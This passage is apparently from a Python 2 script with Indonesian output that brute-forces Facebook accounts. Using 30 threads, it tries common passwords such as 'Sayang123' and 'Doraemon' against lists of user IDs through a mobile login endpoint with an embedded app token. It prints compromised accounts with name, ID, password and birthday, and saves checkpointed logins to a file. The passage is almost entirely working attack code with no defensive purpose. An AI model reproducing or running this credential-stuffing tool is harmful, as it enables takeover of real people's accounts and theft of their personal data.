															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																z = json.loads(x.text)
																print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
																print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																	print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
																	print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																	cek = open("out/super_cp.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Sayang123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																		z = json.loads(x.text)
																		print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																		print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
																		print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																			print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																			print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
																			print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																			cek = open("out/super_cp.txt", "a")
																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																				pass9 = 'Sayang1234'
																				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																				w = json.load(data)
																				if 'access_token' in w:
																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																					z = json.loads(x.text)
																					print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																					print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
																					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																					oks.append(user+pass9)
																				else:
																					if 'www.facebook.com' in w['error_msg']:
																						print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																						print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																						print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
																						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																						cek = open("out/super_cp.txt", "a")
																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")
																						cek.close()
																						cekpoint.append(user+pass9)
																					else:
																						pass10 = 'Bangsat'
																						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																						w = json.load(data)
																						if 'access_token' in w:
																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																							z = json.loads(x.text)
																							print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																							print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
																							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																							oks.append(user+pass10)
																						else:
																							if 'www.facebook.com' in w['error_msg']:
																								print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																								print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
																								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																								cek = open("out/super_cp.txt", "a")
																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
																								cek.close()
																								cekpoint.append(user+pass10)
																							else:
																								pass11 = 'Doraemon'
																								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																								w = json.load(data)
																								if 'access_token' in w:
																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																									z = json.loads(x.text)
																									print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
																									print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
																									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																									oks.append(user+pass11)
																								else:
																									if 'www.facebook.com' in w['error_msg']:
																										print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
																										print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
																										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
																										cek = open("out/super_cp.txt", "a")
																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")
																										cek.close()
																										cekpoint.append(user+pass11)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;34m████████████████████████████████████████████████"
	print '\033[1;97m[\033[1;93m✔\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;93m✴\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;93m➹\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
	print "\033[1;34m████████████████████████████████████████████████"
	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
	os.system("python2 Testing.py")
	

	
			
if __name__=='__main__':
        menu()
        masuk()